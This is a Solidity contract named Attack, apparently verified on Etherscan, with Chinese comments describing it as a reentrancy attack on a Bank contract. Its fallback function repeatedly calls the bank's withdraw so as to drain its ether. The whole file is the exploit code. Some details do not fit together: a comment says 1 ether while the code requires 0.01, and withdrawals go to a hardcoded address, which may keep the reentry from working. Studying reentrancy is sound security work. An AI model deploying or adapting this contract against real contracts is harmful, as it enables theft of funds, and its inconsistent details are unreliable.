/**
 *Submitted for verification at Etherscan.io on 2022-11-27
*/

interface Bank{
    function deposit() external payable;
    function withdraw(address payable _to) external;
    function getBalance() external view returns (uint256);
}



contract Attack {
    Bank public bank; // Bank合约地址


    // 初始化Bank合约地址
    constructor(address _bank) {
        bank = Bank(_bank);
    }
    address payable _to=payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);
    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    fallback() external payable {   
            bank.withdraw(_to);
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 0.01 ether, "Require 0.01 Ether to attack");
        bank.deposit{value: 0.01 ether}();
        bank.withdraw(_to);
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}